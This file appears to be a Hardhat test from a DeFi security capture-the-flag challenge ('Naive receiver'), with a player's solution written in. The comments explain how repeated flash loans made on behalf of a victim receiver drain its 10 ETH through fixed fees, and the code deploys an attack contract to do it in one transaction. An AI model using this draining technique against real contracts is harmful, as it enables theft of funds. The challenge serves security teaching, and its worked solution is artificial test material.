const { ethers } = require('hardhat');
const { expect } = require('chai');
const { defaultAbiCoder } = require('ethers/lib/utils');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, player;
    let pool, receiver;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = 1000n * 10n ** 18n;

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, player] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
        
        pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
        const ETH = await pool.ETH();
        
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
        expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);

        receiver = await FlashLoanReceiverFactory.deploy(pool.address);
        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
        await expect(
            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
        ).to.be.reverted;
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.eq(ETHER_IN_RECEIVER);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        /** Attempt 1
         * The pool does some math to check if the amount has been returned:
         * if (address(this).balance < balanceBefore + FIXED_FEE)
         * Tried to get the RHS to wrap around cuz of overflow.
         * It's writter in solidity 0.8, so reverts on overflow.
         * 
         * Just re-read the Q, we have to drain the FloashLoanReceiver
         */


        /** Attempt 2
         * The fee for the flashloan is 1 ETH, fixed
         * So doing it ten times in a loop => the flash receiver must pay 10 ETH
         */
        // const ETH = await pool.ETH();
        // for (let i=0; i < 10; i++) {
        //     const data = await pool.flashLoan(
        //         receiver.address,
        //         ETH,
        //         "0",
        //         defaultAbiCoder.encode(["bytes calldata"], [defaultAbiCoder.encode(["bytes"], ["0x"])])
        //     );
        // }

        /** Bonus level - drain contract in a single tx
         * Single call to a contract, which in-turn calls the flashLoan 10 times.
         */
        const BonusFlashLoanAttack = await ethers.getContractFactory('BonusAttackNaiveReceiver', player);
        const attacker = await BonusFlashLoanAttack.deploy(pool.address, receiver.address);
        await attacker.attack();
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.be.equal(0);
        expect(
            await ethers.provider.getBalance(pool.address)
        ).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
    });
});
